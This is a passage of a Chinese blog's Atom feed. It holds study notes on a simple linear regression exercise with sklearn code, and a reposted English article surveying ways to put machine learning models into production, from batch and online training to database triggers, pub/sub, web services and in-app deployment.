class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;SparkML也是个大坑，先在这里贴上pom文件&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Reading notes" scheme="http://yoursite.com/categories/Reading-notes/"/>
    
      <category term="Spark机器学习案例实战" scheme="http://yoursite.com/categories/Reading-notes/Spark%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98/"/>
    
    
      <category term="Reading notes" scheme="http://yoursite.com/tags/Reading-notes/"/>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/tags/Mechine-Learning/"/>
    
  </entry>
  
  <entry>
    <title>Simple Linear Regression | Day 2</title>
    <link href="http://yoursite.com/2019/05/24/day02/"/>
    <id>http://yoursite.com/2019/05/24/day02/</id>
    <published>2019-05-23T19:20:52.273Z</published>
    <updated>2019-05-23T09:42:46.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这边还是直接贴上原图吧，手打实在是比较累，而且我按图打字的时候容易分心，很容易变成机械运动，不如直接上图。</p></blockquote><a id="more"></a> <p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g39v8hb3uzj20m81jk4qp.jpg" alt></p><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">dataset = pd.read_csv(<span class="string">'F:\\dataset\\100-Days-Of-ML-Code-master\\datasets\\studentscores.csv'</span>)</span><br><span class="line">X = dataset.iloc[ : ,   : <span class="number">1</span> ].values</span><br><span class="line">Y = dataset.iloc[ : , <span class="number">1</span> ].values</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">X_train, X_test, Y_train, Y_test = train_test_split( X, Y, test_size = <span class="number">1</span>/<span class="number">4</span>, random_state = <span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line">regressor = LinearRegression()</span><br><span class="line">regressor = regressor.fit(X_train, Y_train)</span><br><span class="line"></span><br><span class="line">Y_pred = regressor.predict(X_test)</span><br><span class="line"></span><br><span class="line">plt.scatter(X_train , Y_train, color = <span class="string">'red'</span>)</span><br><span class="line">plt.plot(X_train , regressor.predict(X_train), color =<span class="string">'blue'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3bbvz6ns6j20ac070mx2.jpg" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plt.scatter(X_test , Y_test, color = <span class="string">'red'</span>)</span><br><span class="line">plt.plot(X_test , regressor.predict(X_test), color =<span class="string">'blue'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3bbwiv3v2j20ac070q2u.jpg" alt></p><h4 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h4><p>第二天的内容比较简单，没有需要特别结实的内容</p><p>值得注意的是，最后两个测试结果可视化和训练结果可视化内容里面的向量其实是一样的，<code>Y_pred = regressor.predict(X_test)</code>这一步其实类似于保存结果，但是后面不知道为什么没有直接使用起来，有点奇怪。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;这边还是直接贴上原图吧，手打实在是比较累，而且我按图打字的时候容易分心，很容易变成机械运动，不如直接上图。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/categories/Mechine-Learning/"/>
    
      <category term="100 Days Of ML Code" scheme="http://yoursite.com/categories/Mechine-Learning/100-Days-Of-ML-Code/"/>
    
    
      <category term="Linear Regression" scheme="http://yoursite.com/tags/Linear-Regression/"/>
    
  </entry>
  
  <entry>
    <title>将机器学习模型应用入生产的几种策略</title>
    <link href="http://yoursite.com/2019/05/21/Overview%20of%20the%20different%20approaches%20to%20putting%20Machine%20Learning%20(ML)%20models%20in%20production/"/>
    <id>http://yoursite.com/2019/05/21/Overview of the different approaches to putting Machine Learning (ML) models in production/</id>
    <published>2019-05-20T19:04:39.957Z</published>
    <updated>2019-05-20T19:57:56.846Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>原文 <a href="https://medium.com/analytics-and-data/overview-of-the-different-approaches-to-putting-machinelearning-ml-models-in-production-c699b34abf86" target="_blank" rel="noopener"><overview of the different approaches to putting machine learning (ml) models in production></overview></a></p></blockquote><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wmih501j20m80fwmzi.jpg" alt></p><a id="more"></a> <p>There are different approaches to putting models into productions, with benefits that can vary dependent on the specific use case. Take for example the use case of churn prediction, there is value in having a static value already that can easily be looked up when someone call a customer service, but there is some extra value that could be gained if for specific events, the model could be re-run with the newly acquired information.</p><p>There is generally different ways to both train and server models into production:</p><ul><li><strong>Train</strong>: one off, batch and real-time/online training</li><li><strong>Serve:</strong> Batch, Realtime (Database Trigger, Pub/Sub, web-service, inApp)</li></ul><p>Each approach having its own set of benefits and tradeoffs that need to be considered.</p><h3 id="One-off-Training"><a href="#One-off-Training" class="headerlink" title="One off Training"></a>One off Training</h3><p>Models don’t necessarily need to be continuously trained in order to be pushed to production. Quite often a model can be just trained ad-hoc by a data-scientist, and pushed to production until its performance deteriorates enough that they are called upon to refresh it.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wn761fzj209m09tq63.jpg" alt></p><blockquote><p>From Jupyter to Prod</p></blockquote><p>DataScientists prototyping and doing machine learning tend to operate in their environment of choice <a href="https://jupyter.org/" target="_blank" rel="noopener">Jupyter</a> Notebooks. Essentially an advanced GUI on a <a href="https://en.wikipedia.org/wiki/Read–eval–print_loop" target="_blank" rel="noopener">repl</a>, that allows you to save both code and command outputs.</p><p>Using that approach it is more than feasible to push an ad-hoc trained model from some piece of code in Jupyter to production. Different types of libraries and other notebook providers help further tie the link between the data-scientist workbench and production.</p><h4 id="Model-Format"><a href="#Model-Format" class="headerlink" title="Model Format"></a>Model Format</h4><p><a href="https://docs.python.org/3/library/pickle.html" target="_blank" rel="noopener">Pickle</a> converts a python object to to a bitstream and allows it to be stored to disk and reloaded at a later time. It is provides a good format to store machine learning models provided that their intended applications is also built in python.</p><p><a href="https://github.com/onnx" target="_blank" rel="noopener">ONNX</a> the Open Neural Network Exchange format, is an open format that supports the storing and porting of predictive model across libraries and languages. Most deep learning libraries support it and sklearn also has a library extension to convert their model to <a href="https://github.com/onnx/sklearn-onnx/blob/master/docs/tutorial.rst" target="_blank" rel="noopener">ONNX’s format</a>.</p><p><a href="https://en.wikipedia.org/wiki/Predictive_Model_Markup_Language" target="_blank" rel="noopener">PMML</a> or Predictive model markup language, is another interchange format for predictive models. Like for ONNX sklearn also has another library extension for converting the models to <a href="https://github.com/jpmml/sklearn2pmml" target="_blank" rel="noopener">PMML format</a>. It has the drawback however of only supporting certain type of prediction models.PMML has been around since 1997 and so has a large footprint of applications leveraging the format. Applications such as <a href="https://archive.sap.com/kmuuid2/a07faefd-61d7-2c10-bba6-89ac5ffc302c/Integrating Real-time Predictive Analytics into SAP Applications.pdf" target="_blank" rel="noopener">SAP</a> for instance is able to leverage certain versions of the PMML standard, likewise for CRM applications such as <a href="https://community.pega.com/knowledgebase/supported-pmml-model-types" target="_blank" rel="noopener">PEGA</a>.</p><p><a href="http://docs.h2o.ai/h2o/latest-stable/h2o-docs/productionizing.html#about-pojos-and-mojos" target="_blank" rel="noopener">POJO and MOJO </a>are <a href="https://www.h2o.ai/" target="_blank" rel="noopener">H2O.ai</a>’s export format, that intendeds to offers an easily embeddable model into java application. They are however very specific to using the H2O’s platform.</p><h4 id="Training"><a href="#Training" class="headerlink" title="Training"></a>Training</h4><p>For one off training of models, the model can either be trained and fine tune adhoc by a data-scientists or training through AutoML libraries. Having an easily reproducible setup, however helps pushing into the next stage of productionalization, ie: batch training.</p><h3 id="Batch-Training"><a href="#Batch-Training" class="headerlink" title="Batch Training"></a>Batch Training</h3><p>While not fully necessary to implement a model in production, batch training allows to have a constantly refreshed version of your model based on the latest train.</p><p>Batch training can benefit a-lot from AutoML type of frameworks, AutoML enables you to perform/automate activities such as feature processing, feature selection, model selections and parameter optimization. Their recent performance has been on par or bested the most diligent data-scientists.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wnpy6yjj20m80gntax.jpg" alt></p><p>Using them allows for a more comprehensive model training than what was typically done prior to their ascent: simply retraining the model weights.</p><p>Different technologies exists that are made to support this continuous batch training, these could for instance be setup through a mix of <a href="https://medium.com/analytics-and-data/airflow-the-easy-way-f1c26859ee21" target="_blank" rel="noopener">airflow</a> to manage the different workflow and an AutoML library such as <a href="https://epistasislab.github.io/tpot/" target="_blank" rel="noopener">tpot</a>, Different cloud providers offer their solutions for AutoML that can be put in a data workflow. Azure for instance integrates machine learning prediction and model training with their <a href="https://azure.microsoft.com/es-es/blog/retraining-and-updating-azure-machine-learning-models-with-azure-data-factory/" target="_blank" rel="noopener">data factory offering</a>.</p><h3 id="Real-time-training"><a href="#Real-time-training" class="headerlink" title="Real time training"></a>Real time training</h3><p>Real-time training is possible with ‘Online Machine Learning’ models, algorithms supporting this method of training includes K-means (through mini-batch), Linear and Logistic Regression (through Stochastic Gradient Descent) as well as Naive Bayes classifier.</p><p>Spark has StreamingLinearAlgorithm/StreamingLinearRegressionWithSGD to perform these operations, sklearn has SGDRegressor and SGDClassifier that can be incrementally trained. In sklearn, the incremental training is done through the partial_fit method as shown below:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> linear_model</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">X_0 = pd.DataFrame([[<span class="number">0</span>,<span class="number">0</span>], [<span class="number">1</span>,<span class="number">0</span>]] )</span><br><span class="line">y_0 = pd.DataFrame([[<span class="number">0</span>], [<span class="number">0</span>]])</span><br><span class="line"></span><br><span class="line">X_1 = pd.DataFrame([[<span class="number">0</span>,<span class="number">1</span>], [<span class="number">1</span>,<span class="number">1</span>], [<span class="number">1</span>,<span class="number">1</span>]])</span><br><span class="line">y_1 = pd.DataFrame([[<span class="number">1</span>], [<span class="number">1</span>], [<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line">clf = linear_model.SGDClassifier()</span><br><span class="line"></span><br><span class="line">clf.partial_fit(X_0, y_0, classes=[<span class="number">0</span>,<span class="number">1</span>])</span><br><span class="line">print(clf.predict([[<span class="number">0</span>,<span class="number">0</span>]])) <span class="comment"># -&gt; 0</span></span><br><span class="line">print(clf.predict([[<span class="number">0</span>,<span class="number">1</span>]])) <span class="comment"># -&gt; 0</span></span><br><span class="line"></span><br><span class="line">clf.partial_fit(X_1, y_1, classes=[<span class="number">0</span>,<span class="number">1</span>])</span><br><span class="line">print(clf.predict([[<span class="number">0</span>,<span class="number">0</span>]])) <span class="comment"># -&gt; 0</span></span><br><span class="line">print(clf.predict([[<span class="number">0</span>,<span class="number">1</span>]])) <span class="comment"># -&gt; 1</span></span><br></pre></td></tr></table></figure><p>When deploying this type of models there needs to be serious operational support and monitoring as the model can be sensitive to new data and noise, and model performance needs to be monitored on the fly. In offline training, you can filter points of <a href="https://en.wikipedia.org/wiki/Leverage_(statistics" target="_blank" rel="noopener">high leverage</a>) and correct for this type of incoming data. This is much harder to do when you are constantly updating your model training based on a stream of new data points.</p><p>Another challenge that occurs with training online model is that they don’t decay historical information. This means that, on case there are structural changes in your datasets, the model will need to be anyway re-trained and that there will be a big onus in model lifecycle management.</p><h3 id="Batch-vs-Real-time-Prediction"><a href="#Batch-vs-Real-time-Prediction" class="headerlink" title="Batch vs. Real-time Prediction"></a>Batch vs. Real-time Prediction</h3><p>When looking at whether to setup a batch or real-time prediction, it is important to get an understanding of why doing real-time prediction would be important. It can potentially be for getting a new score when significant event happen, for instance what would be the churn score of customer when they call a contact center. These benefits needs to be weighted against the complexity and cost implications that arise from doing real-time predictions.</p><p><strong>Load implications</strong></p><p>Catering to real time prediction, requires a way to handle peak load. Depending on the approach taken and how the prediction ends up being used, choosing a real-time approach, might also require to have machine with extra computing power available in order to provide a prediction within a certain SLA. This contrasts with a batch approach where the predictions computing can be spread out throughout the day based on available capacity.</p><p><strong>Infrastructure Implications</strong></p><p>Going for real-time, put a much higher operational responsibility. People need to be able to monitor how the system is working, be alerted when there is issue as well as take some consideration with respect to failover responsibility. For batch prediction, the operational obligation is much lower, some monitoring is definitely needed, and altering is desired but the need to be able to know of issues arising directly is much lower.</p><p><strong>Cost Implications</strong></p><p>Going for real-time predictions also has costs implications, going for more computing power, not being able to spread the load throughout the day can force into purchasing more computing capacity than you would need or to pay for spot price increase. Depending on the approach and requirements taken there might also be extra cost due to needing more powerful compute capacity in order to meet SLAs. Furthermore, there would tend to be a higher infrastructure footprint when choosing for real time predictions. One potential caveat there is where the choice is made to rely on in app prediction, for that specific scenario the cost might actually end up being cheaper than going for a batch approach.</p><p><strong>Evaluation Implications</strong></p><p>Evaluating the prediction performance in real-time manner can be more challenging than for batch predictions. How do you evaluate performance when you are faced with a succession of actions in a short burst producing multiple predictions for a given customer for instance? Evaluating and debugging real-time prediction models are significantly more complex to manage. They also require a log collection mechanism that allows to both collect the different predictions and features that yielded the score for further evaluation.</p><h3 id="Batch-Prediction-Integration"><a href="#Batch-Prediction-Integration" class="headerlink" title="Batch Prediction Integration"></a>Batch Prediction Integration</h3><p>Batch predictions rely on two different set of information, one is the predictive model and the other one is the features that we will feed the model. In most type of batch prediction architecture, ETL is performed to either fetch pre-calculated features from a specific datastore (feature-store) or performing some type of transformation across multiple datasets to provide the input to the prediction model. The prediction model then iterates over all the rows in the datasets providing the different score.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wou2v4sj20ja08d74l.jpg" alt></p><p>Once all the predictions have been computed, we can then “serve” the score to the different systems wanting to consume the information. This can be done in different manner depending on thee use case for which we want to consume the score, for instance if we wanted to consume the score on a front-end application, we would most likely push the data to a “cache” or NoSQL database such as Redis so that we can offer milliseconds responses, while for certain use cases such as the creation of an email journey, we might just be relying on a CSV SFTP export or a data load to a more traditional RDBMS.</p><h3 id="Real-time-Prediction-integration"><a href="#Real-time-Prediction-integration" class="headerlink" title="Real-time Prediction integration"></a><strong>Real-time Prediction integration</strong></h3><p>Being able to push model into production for real-time applications require 3 base components. A customer/user profile, a set of triggers and predictive models.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wp3or7dj20em02k3yg.jpg" alt></p><p><strong>Profile:</strong> The customer profile contains all the related attribute to the customer as well as the different attributes (eg: counters) necessary in order to make a given prediction. This is required for customer level prediction in order to reduce the latency of pulling the information from multiple places as well as to simplify the integration of machine learning models in productions. In most cases a similar type of data store would be needed in order to effectively fetch the data needed to power the prediction model.</p><p><strong>Triggers:</strong> Triggers are events causing the initiation of process, they can be for churn for instance, call to a customer service center, checking information within your order history, etc …</p><p><strong>Models:</strong> models need to have been pre-trained and typically exported to one of the 3 formats previously mentioned (pickle, ONNX or PMML) to be something that we could easily port to production.</p><p>There are quite a few different approach to putting models for scoring purpose in production:</p><ul><li><em>Relying on in Database integration:</em> a lot of database vendors have made a significant effort to tie up advanced analytics use cases within the database. Be it by direct integration of Python or R code, to the import of PMML model.</li><li><em>Exploiting a Pub/Sub model</em>: The prediction model is essentially an application feeding of a data-stream and performing certain operations, such as pulling customer profile information.</li><li><em>Webservice:</em> Setting up an API wrapper around the model prediction and deploying it as a web-service. Depending on the way the web-service is setup it might or might not do the pull or data needed to power the model.</li><li><em>inApp:</em> it is also possible to deploy the model directly into a native or web application and have the model be run on local or external datasources.</li></ul><h4 id="Database-integrations"><a href="#Database-integrations" class="headerlink" title="Database integrations"></a><em>Database integrations</em></h4><p>If the overall size of your database is fairly small (&lt; 1M user profile) and the update frequency is occasional it can make sense to integrate some of the real-time update process directly within the database.</p><p>Postgres possess an integration that allows to run Python code as functions or stored procedure called <a href="http://pl/Python" target="_blank" rel="noopener">PL/Python</a>. This implementation has access to all the libraries that are part of the <strong>PYTHONPATH</strong>, and as such are able to use libraries such as Pandas and SKlearn to run some operations.</p><p>This can be coupled with Postgres’ <a href="https://www.tutorialspoint.com/postgresql/postgresql_triggers.htm" target="_blank" rel="noopener">Triggers</a> Mechanism to perform a run of the database and update the churn score. For instance if a new entry is made to a complaint table, it would be valuable to have the model be re-run in real-time.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wpd8zz1j20f10b5q39.jpg" alt></p><p><strong>Sequence flow</strong></p><p>The flow could be setup in the following way:</p><p><em>New Event:</em> When a new row is inserted in the complain table, an event trigger is generated.</p><p><em>Trigger:</em> The trigger function would update the number of complaint made by this customer in the customer profile table and fetch the updated record for the customer.</p><p><em>Prediction Request:</em> Based on that it would re-run the churn model through PL/Python and retrieve the prediction.</p><p><em>Customer Profile Update:</em> It can then re-update the customer profile with the updated prediction. Downstream flows can then happen upon checking if the customer profile has been updated with new churn prediction value.</p><p><strong>Technologies</strong></p><p>Different databases are able to support the running of Python script, this is the case of PostGres which has a native Python integration as previosuly mentioned, but also of Ms SQL Server through its’ <a href="https://www.sqlshack.com/how-to-use-python-in-sql-server-2017-to-obtain-advanced-data-analytics/" target="_blank" rel="noopener">Machine Learning Service (in Database)</a>, other databases such as Teradata, are able to run R/Python script through an external script command. While Oracle supports <a href="https://docs.oracle.com/database/121/DMPRG/GUID-55C6ADBF-DA64-48B6-A424-5F0A59CD406D.htm#DMPRG701" target="_blank" rel="noopener">PMML model</a> through its data mining extension.</p><h4 id="Pub-Sub"><a href="#Pub-Sub" class="headerlink" title="Pub/Sub"></a>Pub/Sub</h4><p>Implementing real-time prediction through a pub/sub model allows to be able to properly handle the load through throttling. For engineers, it also means that they can just feed the event data through a single “logging” feed, to which different application can subscribe.</p><p>An example, of how this could be setup is shown below:</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wpl246sj20m8058aah.jpg" alt></p><p>The page view event is fired to a specific event topic, on which two application subscribe a page view counter, and a prediction. Both of these application filter out specific relevant event from the topic for their purpose and consume the different messages in the topics. The page view counter app, provides data to power a dashboard, while the prediction app, updates the customer profile.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wpsew6sj20fg08x74h.jpg" alt></p><p><strong>Sequence flow:</strong></p><p>Event messages are pushed to the pub/sub topic as they occur, the prediction app poll the topic for new messages. When a new message is retrieved by the prediction app, it will request and retrieve the customer profile and use the message and the profile information to make a prediction. which it will ultimately push back to the customer profile for further use.</p><p>A slightly different flow can be setup where the data is first consumed by an “enrichment app” that adds the profile information to the message and then pushes it back to a new topic to finally be consumed by the prediction app and pushed onto the customer profile.</p><p><strong>Technologies:</strong></p><p>The typical open source combination that you would find that support this kind of use case in the data ecosystem is a combination of Kafka and Spark streaming, but a different setup is possible on the cloud. On google notably a google pub-sub/dataflow (Beam) provides a good alternative to that combination, on azure a combination of Azure-Service Bus or Eventhub and Azure Functions can serve as a good way to consume the mesages and generate these predictions.</p><p><em>Web Service</em></p><p>We can implement models into productions as web-services. Implementing predictions model as web-services are particularly useful in engineering teams that are fragmented and that need to handle multiple different interfaces such as web, desktop and mobile.</p><p>Interfacing with the web-service could be setup in different way:</p><ul><li>either providing an identifier and having the web-service pull the required information, compute the prediction and return its’ value</li><li>Or by accepting a payload, converting it to a data-frame, making the prediction and returning its’ value.</li></ul><p>The second approach is usually recommended in cases, when there is a lot of interaction happening and a local cache is used to essentially buffer the synchronization with the backend systems, or when needing to make prediction at a different grain than a customer id, for instance when doing session based predictions.</p><p>The systems making use of local storage, tend to have a reducer function, which role is to calculate what would be the customer profile, should the event in local storage be integrated back. As such it provides an approximation of the customer profile based on local data.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wq0vsywj20ix0b5mxt.jpg" alt></p><p><strong>Sequence Flow</strong></p><p>The flow for handling the prediction using a mobile app, with local storage can be described in 4 phases.</p><p><em>Application Initialization (1 to 3)**</em>:** The application initializes, and makes a request to the customer profile, and retrieve its initial value back, and initialize the profile in local storage.</p><p><em>Applications (4):</em> The application stores the different events happening with the application into an array in local storage.</p><p><em>Prediction Preparation (5 to 8)**</em>:*<em> The application wants to retrieve a new churn prediction, and therefore needs to prepare the information it needs to provide to the Churn Web-service. For that, it makes an initial request to local storage to retrieve the values of the profile and the array of events it has stored. Once they are retrieve, it makes a request to a reducer function providing these values as arguments, the reducer function outputs an updated</em> profile with the local events incorporated back into this profile.</p><p><em>Web-service Prediction (9 to 10):</em> The application makes a request to the churn prediction web-service, providing the different the updated*/reduced customer profile from step 8 as part of the payload. The web-service can then used the information provided by the payload to generate the prediction and output its value, back to the application.</p><p><strong>Technologies</strong></p><p>There are quite a few technologies that can be used to power a prediction web-service:</p><p><em>Functions</em></p><p>AWS Lambda functions, Google Cloud functions and Microsoft Azure Functions (although Python support is currently in Beta) offer an easy to setup interface to easily deploy scalable web-services.</p><p>For instance on Azure a prediction web-service could be implemented through a function looking roughly like this:</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> azure.functions <span class="keyword">as</span> func</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.externals <span class="keyword">import</span> joblib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(req: func.HttpRequest)</span> -&gt; func.HttpResponse:</span></span><br><span class="line">    logging.info(<span class="string">'Python HTTP trigger function processed a request.'</span>)</span><br><span class="line">    <span class="keyword">if</span> req.body:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logging.info(<span class="string">"Converting Request to DataFrame"</span>)</span><br><span class="line">            req_body = req.get_json()</span><br><span class="line">            df_body  = pd.DataFrame([req_body])</span><br><span class="line"></span><br><span class="line">            logging.info(<span class="string">"Loadding the Prediction Model"</span>)</span><br><span class="line">            filename = <span class="string">"model.pckl"</span></span><br><span class="line">            loaded_model = joblib.load(filename)</span><br><span class="line">            <span class="comment"># Features names need to have been added to the pickled model</span></span><br><span class="line">            feature_names = loaded_model.feature_names</span><br><span class="line">            <span class="comment"># subselect only the feature names </span></span><br><span class="line">            </span><br><span class="line">            logging.info(<span class="string">"Subselecting the dataframe"</span>)</span><br><span class="line">            df_subselect = df_body[feature_names]</span><br><span class="line">            </span><br><span class="line">            logging.info(<span class="string">"Predicting the Probability"</span>)</span><br><span class="line">            result = loaded_model.predict_proba(df_subselect)</span><br><span class="line">            <span class="comment"># We are looking at the probba prediction for class 1</span></span><br><span class="line">            prediction = result[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> func.HttpResponse(<span class="string">"&#123;prediction&#125;"</span>.format(prediction=prediction), status_code=<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> func.HttpResponse(</span><br><span class="line">             <span class="string">"Please pass a name on the query string or in the request body"</span>,</span><br><span class="line">             status_code=<span class="number">400</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure><p><em>Container</em></p><p>An alternative to functions, is to deploy a flask or django application through a docker container (Amazon ECS, Azure Container Instance or Google Kubernetes Engine). Azure for instance provides an easy way to setup prediction containers through its’ <a href="https://docs.microsoft.com/en-us/azure/machine-learning/service/how-to-deploy-and-where" target="_blank" rel="noopener">Azure Machine Learning service</a>.</p><p><em>Notebooks</em></p><p>Different notebooks providers such as <a href="https://docs.databricks.com/applications/mlflow/models.html" target="_blank" rel="noopener">databricks</a> and <a href="https://www.dataiku.com/dss/features/model-deployment/" target="_blank" rel="noopener">dataiku</a> have notably worked on simplifying the model deployment from their environments. These have the feature of setting up a webservice to a local environment or deploying to external systems such as Azure ML Service, Kubernetes engine etc…</p><h4 id="in-App"><a href="#in-App" class="headerlink" title="in App"></a>in App</h4><p>In certain situations when there are legal or privacy requirements that do not allow for data to be stored outside of an application, or there exists constraints such as having to upload a large amount of files, leveraging a model within the application tend to be the right approach.</p><p>Android-ML Kit or the likes of Caffe2 allows to leverage models within native applications, while <a href="https://www.tensorflow.org/js" target="_blank" rel="noopener">Tensorflow.js</a> and <a href="https://github.com/Microsoft/onnxjs" target="_blank" rel="noopener">ONNXJS</a> allow for running models directly in the browser or in apps leveraging javascripts.</p><h3 id="Considerations"><a href="#Considerations" class="headerlink" title="Considerations"></a>Considerations</h3><p>Beside the method of deployments of the models, they are quite a few important considerations to have when deploying to production.</p><p><strong>Model Complexity</strong></p><p>The complexity of the model itself, is the first considerations to have. Models such as a linear regressions and logistic regression are fairly easy to apply and do not usually take much space to store. Using more complex model such as a neural network or complex ensemble decision tree, will end up taking more time to compute, more time to load into memory on cold start and will prove more expensive to run</p><p><strong>Data Sources</strong></p><p>It is important to consider the difference that could occur between the datasource in productions and the one used for training. While it is important for the data used for the training to be in sync with the context it would be used for in production, it is often impractical to recalculate every value so that it becomes perfectly in-sync.</p><p><strong>Experimentation framework</strong></p><p>Setting up an experimentation framework, A/B testing the performance of different models versus objective metrics. And ensuring that there is sufficient tracking to accurately debug and evaluate models performance a posteriori.</p><h3 id="Wrapping-Up"><a href="#Wrapping-Up" class="headerlink" title="Wrapping Up"></a>Wrapping Up</h3><p>Choosing how to deploy a predictive models into production is quite a complex affair, there are different way to handle the lifecycle management of the predictive models, different formats to stores them, multiple ways to deploy them and very vast technical landscape to pick from.</p><p>Understanding specific use cases, the team’s technical and analytics maturity, the overall organization structure and its’ interactions, help come to the the right approach for deploying predictive models to production.</p><hr><p>More from me on <a href="https://medium.com/analytics-and-data" target="_blank" rel="noopener">Hacking Analytics</a>:</p><ul><li><a href="https://medium.com/analytics-and-data/on-the-evolution-of-data-engineering-c5e56d273e37" target="_blank" rel="noopener">One the evolution of Data Engineering</a></li><li><a href="https://medium.com/analytics-and-data/airflow-the-easy-way-f1c26859ee21" target="_blank" rel="noopener">Airflow, the easy way</a></li><li><a href="https://medium.com/analytics-and-data/e-commerce-analysis-data-structures-and-applications-6420c4fa65e7" target="_blank" rel="noopener">E-commerce Analysis: Data-Structures and Applications</a></li><li><a href="https://medium.com/analytics-and-data/setting-up-airflow-on-azure-connecting-to-ms-sql-server-8c06784a7e2b" target="_blank" rel="noopener">Setting up Airflow on Azure &amp; connecting to MS SQL Server</a></li><li><a href="https://medium.com/analytics-and-data/3-simple-rules-to-build-machine-learning-models-that-add-value-61106db88461" target="_blank" rel="noopener">3 simple rules to build machine learning Models that add value</a></li></ul><blockquote><p>简单看了下，没有深入纠结，本文主要从离线和实时两个方面介绍了ML的应用，给了一些简单的例子。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
